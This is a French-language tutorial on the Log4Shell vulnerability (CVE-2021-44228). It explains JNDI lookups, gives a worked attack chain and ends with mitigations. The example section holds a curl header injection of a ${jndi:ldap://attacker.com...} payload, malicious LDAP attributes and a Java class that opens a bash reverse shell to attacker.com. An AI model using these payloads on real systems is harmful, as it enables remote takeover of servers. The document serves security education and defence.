Qu'est-ce que Log4Shell?

Log4Shell est une vulnérabilité critique de type Remote Code Execution (RCE) découverte en décembre 2021 dans la bibliothèque de logging Java Apache Log4j 2.

🎯 Pourquoi est-elle si dangereuse?

  • Score CVSS: 10.0/10 - Criticité maximale
  • Exploitation triviale - Peut être exploitée avec une simple requête HTTP
  • Impact massif - Des millions d'applications Java affectées
  • Pas d'authentification requise - Exploitable à distance sans credentials
  • Exécution de code arbitraire - Contrôle total du serveur
Attention: Cette vulnérabilité a affecté des entreprises majeures comme Apple, Amazon, Tesla, Twitter, et des millions de serveurs à travers le monde.

📅 Chronologie

  • 9 décembre 2021: Découverte publique de la vulnérabilité
  • 10 décembre 2021: Publication du CVE-2021-44228
  • Décembre 2021: Exploitation massive dans le monde entier
  • Aujourd'hui: Toujours activement exploitée

Comment fonctionne JNDI?

JNDI (Java Naming and Directory Interface) est une API Java qui permet aux applications de découvrir et d'accéder à des ressources via des noms.

🔍 Fonctionnement Normal de JNDI

JNDI permet de:

  • Rechercher des objets Java distants
  • Se connecter à des bases de données (JDBC)
  • Accéder à des services LDAP, DNS, RMI
  • Charger des classes Java dynamiquement
// Exemple d'utilisation légitime de JNDI
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/myDB");

⚠️ Le Problème avec Log4j

Log4j 2 permet l'utilisation de lookups JNDI dans les messages de log via la syntaxe:

${jndi:ldap://attacker.com:1389/Exploit}

Lorsque Log4j traite ce message, il:

  1. Détecte la syntaxe ${jndi:...}
  2. Effectue une requête JNDI vers le serveur spécifié
  3. Télécharge et exécute le code Java malveillant
Info: C'est cette fonctionnalité de "lookup" automatique qui transforme une simple bibliothèque de logging en vecteur d'attaque RCE.

💻 Exemple Pratique

Étape 1: Injection du Payload

curl http://vulnerable-app:8080 \
-H 'X-Api-Version: ${jndi:ldap://attacker.com:1389/Exploit}'

Étape 2: Serveur LDAP Malveillant

# Le serveur LDAP répond avec une référence vers une classe Java
javaCodeBase: http://attacker.com:8888/
javaClassName: Exploit

Étape 3: Payload Java (Exploit.class)

public class Exploit {
static {
try {
// Reverse shell
Runtime.getRuntime().exec(
"bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
);
} catch (Exception e) {}
}
}

🛡️ Vecteurs d'Injection

Le payload peut être injecté via:

  • Headers HTTP: User-Agent, X-Forwarded-For, Cookie, etc.
  • Paramètres GET/POST: Formulaires, API endpoints
  • Champs de formulaire: Username, email, etc.
  • Messages d'erreur: Tout ce qui est loggé
Défense:
  • Mettre à jour Log4j vers la version 2.17.1 ou supérieure
  • Désactiver les lookups JNDI: -Dlog4j2.formatMsgNoLookups=true
  • Utiliser un WAF pour bloquer les patterns ${jndi:
  • Segmenter le réseau pour limiter les connexions sortantes
